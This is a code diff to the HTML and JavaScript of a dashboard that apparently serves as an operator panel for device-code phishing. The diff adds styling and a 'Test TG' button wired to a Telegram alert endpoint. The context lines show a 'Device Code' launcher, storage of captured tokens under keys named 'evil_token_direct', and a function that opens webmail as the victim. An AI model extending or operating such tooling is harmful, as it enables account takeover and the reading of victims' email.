@@ -77,6 +77,8 @@
         body.light-glass .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); }
         body.light-glass .btn-gold { border-color: rgba(180, 130, 0, 0.4); color: #8b6914; }
         body.light-glass .btn-gold:hover { background: rgba(180, 130, 0, 0.1); }
+        body.light-glass .btn-telegram { border-color: rgba(0, 160, 220, 0.4); color: #0078b0; }
+        body.light-glass .btn-telegram:hover { background: rgba(0, 160, 220, 0.1); }
         body.light-glass .modal-content {
             background: rgba(255, 255, 255, 0.3); backdrop-filter: blur(20px); border-color: rgba(255, 255, 255, 0.4);
         }
@@ -122,6 +124,8 @@
         .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); box-shadow: 0 4px 25px rgba(83, 109, 254, 0.5); border-color: transparent; }
         .btn-gold { background: transparent; border-color: rgba(255, 215, 0, 0.3); color: #ffd700; }
         .btn-gold:hover { background: rgba(255, 215, 0, 0.08); border-color: #ffd700; box-shadow: 0 0 20px rgba(255, 215, 0, 0.15); }
+        .btn-telegram { background: transparent; border-color: rgba(0, 200, 255, 0.3); color: #4FC3F7; }
+        .btn-telegram:hover { background: rgba(0, 200, 255, 0.08); border-color: #4FC3F7; box-shadow: 0 0 20px rgba(0, 200, 255, 0.15); }
         .btn-success { background: linear-gradient(135deg, #00c853, #00e676); border-color: transparent; color: #fff; }
         .btn-sm { padding: 4px 12px; font-size: 11px; border-radius: 30px; }
 
@@ -201,6 +205,7 @@
             <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
             <button class="btn btn-primary" onclick="exportAll()">📦 Export ZIP</button>
             <button class="btn btn-gold" onclick="window.open('/device','_blank')">📱 Device Code</button>
+            <button class="btn btn-telegram" onclick="testTelegram()">📤 Test TG</button>
         </div>
     </header>
 
@@ -412,6 +417,23 @@
         if (!token) { showToast('❌ No token available', true); return; }
         localStorage.setItem('evil_token_direct', token); localStorage.setItem('evil_token_user', username);
         window.open('/webmail', '_blank'); showToast(`📧 Opening webmail for ${username}...`);
+    }
+
+    // =============================================
+    // 📤 TEST TELEGRAM
+    // =============================================
+    async function testTelegram() {
+        try {
+            const res = await fetch('/dash/api/test-telegram');
+            const data = await res.json();
+            if (data.success) {
+                showToast('✅ Telegram test message sent! Check your chat.');
+            } else {
+                showToast('❌ Telegram test failed: ' + (data.error || 'Unknown error'), true);
+            }
+        } catch (e) {
+            showToast('❌ Telegram test failed: ' + e.message, true);
+        }
     }
 
     // =============================================
